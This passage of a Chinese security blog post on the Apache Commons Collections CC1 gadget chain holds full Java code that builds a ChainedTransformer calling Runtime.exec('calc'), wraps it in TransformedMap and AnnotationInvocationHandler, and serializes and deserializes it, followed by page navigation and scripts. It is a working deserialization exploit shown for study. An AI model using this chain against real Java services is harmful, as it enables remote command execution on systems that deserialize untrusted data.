+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line"><span class="comment">//恶意攻击类,命令执行</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="comment">//通过ChainedTransformer循环遍历到ConstantTransformer的transform方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">            HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1111&quot;</span>);</span><br><span class="line">            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">//创建AnnotationInvocationHandler类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,transformedmap);</span><br><span class="line">            <span class="comment">//创建AnnotationInvocationHandler实例并将transformedmap赋值给memberValues属性。</span></span><br><span class="line"></span><br><span class="line">            serialize(o);</span><br><span class="line">            unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC1调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">图解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer%E7%B1%BB%E7%9A%84transform%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">InvokerTransformer类的transform方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95%E4%B8%AD%E8%B0%83%E7%94%A8%E4%BA%86valueTransformer-transform%EF%BC%88%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">TransformedMap中的checkSetValue方法中调用了valueTransformer.transform（）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MapEntry%E7%B1%BB%E7%9A%84setValue%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E4%BA%86TransformedMap%E7%B1%BB%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">入口类</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2025/04/22/Commons-Collection01/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&text=Commons-Collection01"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&is_video=false&description=Commons-Collection01"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons-Collection01&body=Check out this article: https://dgxddd.github.io/2025/04/22/Commons-Collection01/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&title=Commons-Collection01"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&name=Commons-Collection01&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2025/04/22/Commons-Collection01/&t=Commons-Collection01"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
